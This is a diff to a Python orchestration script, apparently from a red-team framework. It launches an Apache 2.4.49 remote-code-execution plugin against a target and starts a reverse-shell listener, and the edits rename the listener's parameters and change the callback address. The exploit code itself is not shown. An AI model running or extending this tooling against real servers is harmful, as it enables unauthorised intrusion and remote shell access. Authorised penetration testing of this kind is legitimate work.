@@ -7,9 +7,10 @@ import rs_client
 import sys
 import plugins.initial_access.plugin_initial_access_apache2_4_49_RCE as plugin_initial_access_apache2_4_49_RCE
 
-def listener(port, address):
+def listener(listener_port, listener_address):
+    print('listener_address :' + listener_address)
     sys.stdin = open(0)
-    rs_client.main(port, address)
+    rs_client.main(listener_port, listener_address)
 
 def exploit(target_ip, target_port, local_ip, local_port):
     try:
@@ -55,7 +56,7 @@ if __name__ == '__main__':
             target_port = i['port']
             listener_process = Process(target=listener, args=(args.local_port, LOCAL_IP))
             listener_process.start()
-            exploit_process = Process(target=exploit, args=(args.target_ip, target_port, args.local_ip, args.local_port))
+            exploit_process = Process(target=exploit, args=(args.target_ip, target_port, LOCAL_IP, args.local_port))
             exploit_process.start()
             listener_process.join()
             exploit_process.join()
